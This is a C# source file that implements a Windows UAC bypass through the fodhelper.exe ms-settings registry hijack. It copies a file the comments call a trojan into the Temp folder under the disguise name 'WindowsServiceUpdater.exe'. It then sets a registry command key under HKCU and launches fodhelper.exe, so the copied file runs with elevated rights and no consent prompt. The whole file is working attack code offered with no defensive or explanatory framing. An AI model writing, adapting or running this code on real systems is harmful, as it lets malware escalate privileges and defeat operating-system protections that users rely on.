using System.Diagnostics;
using Microsoft.Win32;

namespace UACBypass
{
    public class Program
    {
        static void Main(string[] args)
        {
            ByPass(@"C:\Windows\System32\cmd.exe");
        }

        public static void ByPass(string trojanPath)
        {
            // Step 1: copy trojan to temp as WindowsServiceUpdater.exe
            string destinationFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "WindowsServiceUpdater.exe");
            File.Copy(trojanPath, destinationFilePath, true);

            // Step 2: create registry key
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command");

            // Step 3: set DelegateExecute value
            key.SetValue("DelegateExecute", "");

            // Step 4: set default value to the path of WindowsServiceUpdater.exe
            key.SetValue(null, destinationFilePath);

            // Step 5: start fodhelper.exe
            var p = new Process();
            p.StartInfo.FileName = @"C:\Windows\System32\fodhelper.exe";
            p.StartInfo.UseShellExecute = true;
            p.Start();
        }
    }
}